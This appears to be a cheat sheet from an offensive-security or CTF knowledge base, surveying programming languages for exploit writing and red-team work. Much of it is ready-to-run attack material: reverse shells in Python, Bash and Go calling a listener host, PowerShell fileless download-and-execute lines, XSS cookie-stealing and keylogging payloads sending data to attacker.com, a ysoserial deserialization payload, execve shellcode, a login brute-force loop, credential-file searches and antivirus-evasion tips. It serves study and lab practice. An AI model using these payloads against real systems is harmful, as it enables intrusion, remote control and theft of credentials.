# 💻 Programming Languages

> Master the tools of the trade. Whether you're writing exploits, automating recon, reversing binaries, or building offensive tooling — language proficiency is foundational.

> **Grey Hat context:** Language knowledge directly enables exploit development, tool creation, scripting for automation, and understanding of compiled/interpreted targets during reverse engineering and CTF challenges.

---

## Language Overview

| Language   | Primary Use Cases                                              |
| ---------- | -------------------------------------------------------------- |
| C          | Systems programming, exploit dev, shellcoding, kernel modules  |
| C++        | Malware development, game hacking, reverse engineering targets |
| Python     | Automation, exploit scripting, tooling, data parsing           |
| Bash/Shell | Linux scripting, CTF automation, post-exploitation             |
| PowerShell | Windows red teaming, AD enumeration, living off the land       |
| Assembly   | Shellcoding, ROP, reversing, low-level debugging               |
| Rust       | Safe systems tooling, offensive frameworks, modern RE targets  |
| Go         | C2 frameworks, network tooling, cross-compiled implants        |
| JavaScript | XSS payloads, Node.js tools, browser exploitation, web RE      |
| Java       | Android RE, deserialization exploits, enterprise web targets   |

---

## C

### Key Concepts for Security

```c
// Buffer overflow classic — understanding stack layout
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input);  // no bounds check — classic overflow target
    printf("Input: %s\n", buf);
}

int main(int argc, char **argv) {
    if (argc > 1) vulnerable(argv[1]);
    return 0;
}
```

```bash
# Compile with various protections for lab work
gcc vuln.c -o vuln                          # default (ASLR still applies)
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie  # fully vulnerable
gcc vuln.c -o vuln -fstack-protector-all -pie -Wl,-z,relro    # hardened

# Check binary protections
checksec --file=./vuln
```

### Dangerous Functions (Exploitation Targets)

| Function      | Risk                                      |
| ------------- | ----------------------------------------- |
| `gets()`      | No bounds check — always overflows        |
| `strcpy()`    | No length limit                           |
| `sprintf()`   | Format string + overflow risk             |
| `scanf("%s")` | Unbounded string read                     |
| `strcat()`    | Overflow if destination too small         |
| `memcpy()`    | Safe if sizes correct — often they aren't |

### Shellcode Template (x86-64 Linux)

```c
// Minimal execve("/bin/sh") shellcode in C (compile to inspect ASM)
#include <unistd.h>

int main() {
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    return 0;
}
```

---

## Python

### Essential Libraries for Security

```python
# Network & Web
import socket        # raw TCP/UDP
import requests      # HTTP client
from scapy.all import *  # packet crafting

# Binary / Pwn
from pwn import *    # pwntools — exploit dev swiss army knife

# Crypto
from Crypto.Cipher import AES
from cryptography.hazmat.primitives import hashes

# Parsing
import struct        # pack/unpack binary data
import re            # regex
import json, base64, hashlib
```

### pwntools Cheatsheet

```python
from pwn import *

# Connect
p = process('./vuln')         # local binary
p = remote('host', 1337)      # remote TCP
p = gdb.debug('./vuln', gdbscript='b main\nc')  # with GDB

# I/O
p.recv(n)                     # receive n bytes
p.recvline()                  # receive until \n
p.recvuntil(b'> ')            # receive until delimiter
p.send(payload)               # send raw bytes
p.sendline(payload)           # send + \n
p.sendlineafter(b'> ', data)  # wait then send

# Useful helpers
cyclic(100)                   # de Bruijn pattern (find offset)
cyclic_find(0x61616166)       # find offset from crash value
flat([0x41414141, p64(addr)]) # flatten list to bytes
p64(addr)                     # pack 64-bit little-endian
u64(data)                     # unpack 64-bit little-endian
ELF('./vuln').symbols['main'] # resolve symbol address

# ROP
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
```

### Common Exploit Script Skeleton

```python
from pwn import *

context.binary = elf = ELF('./vuln')
context.log_level = 'info'

def conn():
    if args.REMOTE:
        return remote('target.ctf', 1337)
    return process(elf.path)

p = conn()

# Build payload
offset = 72
payload  = b'A' * offset
payload += p64(0xdeadbeef)  # overwrite return address

p.sendlineafter(b'> ', payload)
p.interactive()
```

### Python One-Liners for CTF

```bash
# Decode base64
python3 -c "import base64,sys; print(base64.b64decode(sys.argv[1]).decode())" <data>

# XOR two hex strings
python3 -c "a=bytes.fromhex('deadbeef'); b=bytes.fromhex('cafebabe'); print(bytes(x^y for x,y in zip(a,b)).hex())"

# Start a simple HTTP server
python3 -m http.server 8080

# Generate reverse shell payload
python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect(('10.10.10.10',4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(['/bin/sh'])"
```

---

## Bash / Shell

### CTF Automation Patterns

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="http://target.ctf"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Loop + brute-force pattern
while IFS= read -r word; do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$TARGET/login" \
        -d "user=admin&pass=$word")
    [[ "$response" == "302" ]] && echo "[+] Found: $word" && break
done < "$WORDLIST"
```

```bash
# Useful one-liners
# Reverse shell listener
nc -lvnp 4444

# Port scan without nmap
for port in {1..1000}; do
    (echo >/dev/tcp/host/$port) &>/dev/null && echo "Open: $port"
done

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find world-writable files
find / -perm -o+w -type f 2>/dev/null | grep -v /proc

# Extract strings from binary
strings -n 8 binary | grep -iE 'pass|flag|key|secret|token'
```

### Here-Doc for Multi-line Payloads

```bash
cat <<'EOF' > payload.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
EOF
chmod +x payload.sh
```

---

## PowerShell

### Enumeration (Windows Red Team / Living Off the Land)

```powershell
# System info
Get-ComputerInfo | Select-Object OsName, OsVersion, CsUserName
whoami /all

# Network
Get-NetTCPConnection | Where-Object State -eq 'Listen'
ipconfig /all
arp -a

# Active Directory enumeration (no extra tools)
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
Get-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, Enabled
Get-ADGroupMember -Identity "Domain Admins"

# Process / service recon
Get-Process | Sort-Object CPU -Descending | Select-Object -First 20
Get-Service | Where-Object Status -eq 'Running'

# Find credentials / sensitive files
Get-ChildItem C:\ -Recurse -Include *.txt,*.ini,*.config,*.xml 2>$null |
    Select-String -Pattern 'password|pass=|pwd=' -CaseSensitive:$false
```

### Download & Execute (Common Payload Staging)

```powershell
# Download file
Invoke-WebRequest -Uri "http://attacker.com/tool.exe" -OutFile "C:\Windows\Temp\tool.exe"
(New-Object Net.WebClient).DownloadFile("http://attacker.com/tool.exe","C:\Temp\tool.exe")

# Download and execute in memory (fileless)
IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File .\script.ps1
powershell -ep bypass -c "IEX(...)"

# Base64 encode a command (for obfuscation / stageless delivery)
$cmd = 'whoami'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$b64 = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $b64
```

---

## Assembly (x86-64)

### Registers Quick Reference

| Register  | Purpose                       |
| --------- | ----------------------------- |
| `rax`     | Return value / syscall number |
| `rdi`     | Arg 1 (or syscall arg 1)      |
| `rsi`     | Arg 2                         |
| `rdx`     | Arg 3                         |
| `rsp`     | Stack pointer                 |
| `rbp`     | Base pointer (frame)          |
| `rip`     | Instruction pointer           |
| `r10–r11` | Syscall args 4–5 / scratch    |

### Linux Syscall Numbers (x86-64)

| Syscall  | Number | Args                              |
| -------- | ------ | --------------------------------- |
| `read`   | 0      | `fd, buf, count`                  |
| `write`  | 1      | `fd, buf, count`                  |
| `open`   | 2      | `filename, flags, mode`           |
| `execve` | 59     | `filename, argv, envp`            |
| `exit`   | 60     | `error_code`                      |
| `mmap`   | 9      | `addr, len, prot, flags, fd, off` |

### Minimal execve Shellcode (AT&T syntax)

```asm
# x86-64 execve("/bin/sh", NULL, NULL)
.section .text
.global _start
_start:
    xor    %rdx, %rdx           # envp = NULL
    xor    %rsi, %rsi           # argv = NULL
    lea    binsh(%rip), %rdi    # rdi = "/bin/sh"
    mov    $59, %rax            # syscall: execve
    syscall

binsh:
    .string "/bin/sh"
```

```bash
# Assemble, link, extract shellcode
as --64 -o shell.o shell.s
ld -o shell shell.o
objcopy -O binary --only-section=.text shell shell.bin
xxd shell.bin | head
```

---

## Rust

### Why Rust for Security Tooling

- Memory-safe by default — avoids common C bugs in your own tools
- Compiles to native binaries with no GC pauses
- Cross-compilation is straightforward
- Increasingly common in modern malware and C2 frameworks as a target for RE

```bash
# Cross-compile to Windows from Linux
rustup target add x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu

# Strip symbols (reduce AV surface / binary size)
cargo build --release
strip target/release/tool
```

```toml
# Cargo.toml — useful security/net crates
[dependencies]
tokio     = { version = "1", features = ["full"] }  # async runtime
reqwest   = { version = "0.11", features = ["json"] }  # HTTP
clap      = { version = "4", features = ["derive"] }   # CLI args
serde     = { version = "1", features = ["derive"] }   # serialization
aes       = "0.8"   # symmetric crypto
sha2      = "0.10"  # hashing
```

---

## Go

### Why Go for Offensive Tooling

- Compiles to a single static binary — easy deployment
- Cross-compiles natively for Windows/Linux/macOS
- Standard library covers most networking needs without external deps
- Used by real-world C2s: Sliver, Merlin, Havoc (partially)

```bash
# Cross-compile
GOOS=windows GOARCH=amd64 go build -o tool.exe main.go
GOOS=linux   GOARCH=amd64 go build -o tool     main.go

# Strip debug info and reduce binary size
go build -ldflags="-s -w" -o tool main.go

# Obfuscate variable/function names (evasion)
# garble: https://github.com/burrowers/garble
garble -literals build -o tool main.go
```

```go
// Minimal TCP reverse shell skeleton
package main

import (
    "net"
    "os/exec"
)

func main() {
    conn, _ := net.Dial("tcp", "10.10.10.10:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
    cmd.Run()
}
```

---

## JavaScript / Node.js

### XSS Payload Reference

```javascript
// Basic alert proof-of-concept
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)

// Cookie stealing
<script>
fetch('https://attacker.com/steal?c=' + document.cookie)
</script>

// Keylogger skeleton
document.addEventListener('keydown', e => {
    fetch('https://attacker.com/log?k=' + encodeURIComponent(e.key))
})

// DOM-based XSS sink check
location.hash
document.write()
innerHTML
eval()
setTimeout('code')
```

### Node.js Security Patterns

```javascript
// Command injection via child_process
const { exec } = require("child_process");
exec("ls " + userInput); // VULNERABLE — never interpolate user input

// Safe alternative
const { execFile } = require("child_process");
execFile("ls", [userInput]); // safe — args are not shell-interpreted

// Prototype pollution check
const payload = JSON.parse('{"__proto__":{"polluted":true}}');
console.log({}.polluted); // true if vulnerable merger is used
```

---

## Java

### Deserialization Exploitation

```bash
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' | base64

# Test with curl
curl -s -X POST http://target.com/deser \
     -H "Content-Type: application/octet-stream" \
     --data-binary @payload.bin
```

### Android RE Entry Points

```bash
# Decompile APK
apktool d target.apk -o output/
jadx -d jadx_out/ target.apk

# Key files to inspect
output/AndroidManifest.xml          # permissions, activities, exported components
output/res/values/strings.xml       # hardcoded strings / API keys
jadx_out/sources/com/target/        # decompiled Java source

# Intercept HTTPS (bypass cert pinning)
frida -U -f com.target.app -l bypass-ssl.js
```

---

## Resources

### General

- [DevDocs](https://devdocs.io) — offline-capable multi-language API reference
- [godbolt.org](https://godbolt.org) — Compiler Explorer, inspect ASM output in real time
- [codepoints.net](https://codepoints.net) — Unicode reference for encoding challenges

### C / C++

- [cppreference.com](https://en.cppreference.com) — definitive C/C++ reference
- [Beej's Guide to C](https://beej.us/guide/bgc/) — free, practical C guide
- [GCC Internals](https://gcc.gnu.org/onlinedocs/) — understand optimisation for RE

### Python / pwntools

- [pwntools docs](https://docs.pwntools.com) — official pwntools reference
- [Python docs](https://docs.python.org/3/) — standard library reference

### Assembly / Shellcoding

- [shell-storm.org](https://shell-storm.org/shellcode/) — shellcode database
- [syscall.sh](https://syscall.sh) — Linux syscall table (interactive)
- [x86.guide](https://www.felixcloutier.com/x86/) — Intel instruction reference

### PowerShell / Windows

- [LOLBAS](https://lolbas-project.github.io) — Living Off the Land Binaries
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) — PowerShell offensive framework
- [PayloadsAllTheThings — PowerShell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Powershell%20-%20Cheatsheet.md)

### Go / Rust

- [tour.golang.org](https://go.dev/tour/) — official Go tour
- [The Rust Book](https://doc.rust-lang.org/book/) — official Rust learning resource
- [Awesome Go Security](https://github.com/guardrailsio/awesome-go-security)
